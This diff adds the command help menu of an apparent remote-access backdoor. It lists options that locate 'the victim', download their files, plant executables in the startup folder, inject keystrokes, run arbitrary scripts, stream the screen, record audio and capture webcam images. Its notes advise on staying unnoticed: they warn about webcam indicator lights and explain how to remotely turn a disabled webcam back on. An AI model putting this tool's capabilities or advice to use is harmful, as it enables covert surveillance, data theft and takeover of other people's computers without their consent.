@@ -1,0 +1,32 @@
+    OPTIONS                                  DESCRIPTION
+
+-h             --HELP             Displays help menu.
+-ip            --IP               Returns the IP address of the victim.
+-l             --LOCATION         Returns the location of the victim.
+-m             --MACHINE          Shows whether the backdoor is running on a physical or a virtual machine.
+-feu <path>    --FILE-EU <path>   Lets the user upload executable files into the startup folder of victim's machine.
+-fd <path>     --FILE-D <path>    Lets the user download files from victim's machine
+-k <key>       --KEY <key>        Triggers the specified key on victim's machine.
+-k -h          --KEY -h           Opens up help menu for key triggers.
+-pop           --POPUP            Shows a custom popup on victim's machine.
+-scr           --SCRIPT           Run a custom python or batch code on victim's machine.
+                                  * Code can be loaded either from .py or .txt file.
+                                  * All the print statements will be returned back to the user and not be printed on target's machine.
+
+-cmd           --COMMAND          Enter command prompt.
+                                  * multi-line batch scripts cannot be executed on command prompt. Use -scr command to load batch files.
+
+-cam           -CAMERAS           Dumps all the cameras connected to the machine.
+-img <cam no>  --IMAGE <cam no>   Captures an image from webcam using the specified camera number. Default: 0.
+                                  * <cam no> = 0: default webcam. <cam no> = 1, 2, 3... : other externally connected cameras (If available).
+                                  * Some webcams have an activation indicator that turns on when in use. Use this command with precaution.
+                                  * If the captured image is blank, the webcam might be disabled using a keyboard hotkey.
+                                  * Use `systeminfo` on cmd to find the device model, then search for the hotkey to toggle the camera for that specific model.
+                                  * Trigger the hotkey using the `-k` command.
+
+-ss            --SCREENSHOT       Captures a screenshot.
+-sstr          --SCRSTREAM        Starts streaming victim's screen.
+-recr <secs>   --RECORD <secs>    Starts recording the audio for specified seconds. Default: 5
+-sus           --SUSPEND          Temporarily suspends the connection from the host.
+-rec           --RECONNECT        Reconnects back to the host.
+-e             --EXIT             Terminates the backdoor (Backdoor needs to be restarted by the victim).
